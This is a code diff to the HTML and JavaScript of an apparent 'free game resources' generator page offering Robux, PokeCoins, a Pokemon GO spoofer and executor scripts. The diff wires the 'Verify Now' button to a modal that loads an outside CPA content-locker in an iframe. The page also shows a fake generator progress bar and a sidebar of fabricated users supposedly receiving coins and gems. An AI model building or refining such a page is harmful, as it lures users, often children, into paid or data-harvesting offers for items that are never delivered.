@@ -16,6 +16,7 @@
         .status-badge { background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.2); color: #22c55e; padding: 6px 16px; border-radius: 9999px; font-size: 10px; font-weight: 900; display: inline-flex; align-items: center; gap: 8px; }
         .btn-blue { background: linear-gradient(90deg, #1d4ed8, #3b82f6); transition: 0.2s; box-shadow: 0 4px 15px rgba(29, 78, 216, 0.3); }
         .btn-blue:active { transform: scale(0.98); }
+        .flag-icon { width: 20px; height: 14px; border-radius: 2px; object-fit: cover; }
         .game-card:hover { transform: translateY(-5px); border-color: #3b82f6; transition: 0.3s; background: rgba(59, 130, 246, 0.05); }
         .terminal-log { font-family: 'Courier New', Courier, monospace; color: #3b82f6; font-size: 11px; line-height: 1.6; }
         .progress-bar-bg { background: rgba(255, 255, 255, 0.05); border-radius: 999px; height: 8px; overflow: hidden; }
@@ -27,12 +28,14 @@
         .paste-btn { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2); color: #3b82f6; font-size: 10px; font-weight: 900; transition: 0.2s;}
         .paste-btn:hover { background: rgba(59, 130, 246, 0.2); }
         .res-icon { width: 32px; height: 32px; object-fit: contain; filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.5)); }
-        .flag-icon { width: 22px; height: 15px; border-radius: 2px; object-fit: cover; }
         
         /* Spoofer Checkbox Styles */
         .spoofer-check { accent-color: #3b82f6; width: 1.2rem; height: 1.2rem; cursor: pointer; }
         .pack-btn { border: 1px solid rgba(255,255,255,0.1); transition: 0.2s; }
         .pack-btn.active { border-color: #3b82f6; background: rgba(59, 130, 246, 0.1); }
+        
+        /* Modal Styles */
+        .modal-bg { background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); }
     </style>
 </head>
 <body>
@@ -49,7 +52,7 @@
             <h1 class="text-5xl md:text-6xl font-black mb-6 uppercase tracking-tighter">Premium Resources.<br><span class="text-blue-500">Zero Limits.</span></h1>
             <div class="relative max-w-2xl mx-auto">
                 <i class="fa fa-search absolute left-5 top-4 text-zinc-500"></i>
-                <input type="text" id="search-input" placeholder="Search 163+ games and apps..." class="w-full bg-zinc-900 border border-zinc-800 rounded-full py-4 px-14 text-sm focus:outline-none focus:border-blue-500 transition-all">
+                <input type="text" id="search-input" placeholder="Search games and apps..." class="w-full bg-zinc-900 border border-zinc-800 rounded-full py-4 px-14 text-sm focus:outline-none focus:border-blue-500 transition-all">
             </div>
         </div>
         <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4"></div>
@@ -197,7 +200,7 @@
                     <i class="fa fa-shield-alt text-blue-500 text-5xl mb-6"></i>
                     <h2 class="text-2xl font-black mb-4 uppercase tracking-tighter">Verification Required</h2>
                     <p class="text-zinc-500 text-sm mb-8 px-8">Due to high traffic, please complete the manual verification step to release your items to your account.</p>
-                    <button onclick="window.location.href='YOUR_CPA_LINK_HERE'" class="w-full bg-green-600 hover:bg-green-500 py-5 rounded-2xl font-black text-sm uppercase tracking-widest transition-colors shadow-lg shadow-green-900/20">Verify Now</button>
+                    <button onclick="showLocker()" class="w-full bg-green-600 hover:bg-green-500 py-5 rounded-2xl font-black text-sm uppercase tracking-widest transition-colors shadow-lg shadow-green-900/20">Verify Now</button>
                 </div>
 
                 <div class="glass rounded-[2rem] p-10">
@@ -225,7 +228,23 @@
         </div>
     </section>
 
+    <div id="cpa-locker-modal" class="fixed inset-0 z-[9999] hidden flex items-center justify-center modal-bg px-4">
+        <div class="w-full max-w-2xl h-[85vh] bg-[#111] rounded-3xl overflow-hidden border border-white/10 relative shadow-2xl flex flex-col">
+            <div class="bg-[#1a1c23] p-4 flex justify-between items-center border-b border-white/5">
+                <div class="flex items-center gap-2">
+                    <i class="fa fa-lock text-green-500"></i>
+                    <span class="font-black text-sm uppercase tracking-widest">Human Verification</span>
+                </div>
+                <button onclick="document.getElementById('cpa-locker-modal').classList.add('hidden')" class="text-zinc-500 hover:text-white transition-colors w-8 h-8 flex items-center justify-center rounded-full bg-black/50">
+                    <i class="fa fa-times"></i>
+                </button>
+            </div>
+            <iframe src="https://quikfun.info/cl/i/qnnw94" class="w-full flex-1 border-none bg-white"></iframe>
+        </div>
+    </div>
+
     <script>
+        // Array of 16 Games with all exact image URLs provided
         const gamesData = [
             { name: 'Delta Executor', sub: 'Import Latest Scripts', img: 'https://upload.wikimedia.org/wikipedia/commons/c/ce/Delta_Executor_Fivicon.jpg', rating: '4.8', r1: 'Scripts', r2: 'Credits', i1: 'https://cdn-icons-png.flaticon.com/512/2620/2620686.png', i2: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png' },
             { name: 'Pokemon GO', sub: 'Working Spoofer', img: 'https://m.media-amazon.com/images/M/MV5BYTJkNDRhMzAtMzVmOS00ZTE2LTllNzAtOTRiN2M2ZTA4OTI0XkEyXkFqcGc@._V1_.jpg', rating: '4.8', r1: 'PokeCoins', r2: 'Stardust', i1: 'https://cdn-icons-png.flaticon.com/512/2586/2586171.png', i2: 'https://cdn-icons-png.flaticon.com/512/118/118669.png' },
@@ -289,6 +308,7 @@
             document.getElementById('gen-icon').src = selectedGame.img;
             document.getElementById('bg-image-dynamic').style.backgroundImage = `url('${selectedGame.img}')`;
             
+            // Dynamic Layout Logic: Pokemon Go vs Standard
             if (selectedGame.name === 'Pokemon GO') {
                 document.getElementById('standard-layout').classList.add('hidden');
                 document.getElementById('spoofer-layout').classList.remove('hidden');
@@ -371,6 +391,11 @@
             document.getElementById('p-bar').style.width = '0%';
         }
 
+        // Show CPA Locker Modal
+        function showLocker() {
+            document.getElementById('cpa-locker-modal').classList.remove('hidden');
+        }
+
         document.getElementById('search-input').addEventListener('input', (e) => {
             const term = e.target.value.toLowerCase();
             document.querySelectorAll('.game-card').forEach(c => { 
@@ -382,7 +407,7 @@
             const container = document.getElementById('sidebar-logs');
             const flags = ['https://flagcdn.com/w40/us.png', 'https://flagcdn.com/w40/ma.png', 'https://flagcdn.com/w40/gb.png', 'https://flagcdn.com/w40/fr.png', 'https://flagcdn.com/w40/de.png', 'https://flagcdn.com/w40/sa.png'];
             const users = ['ninja', 'hc', 'zack', 'simo', 'm9', 'player1', 'ghost'];
-            const res = ['10K Dice Rolls', '50K Coins', 'VIP Premium', 'Spoofer Package', 'Robux'];
+            const res = ['10K Dice Rolls', '50K Coins', 'VIP Premium', '99K Gems', 'Robux'];
             
             const div = document.createElement('div');
             div.className = 'flex items-start gap-4 border-b border-white/5 pb-4 animate-fade-in';
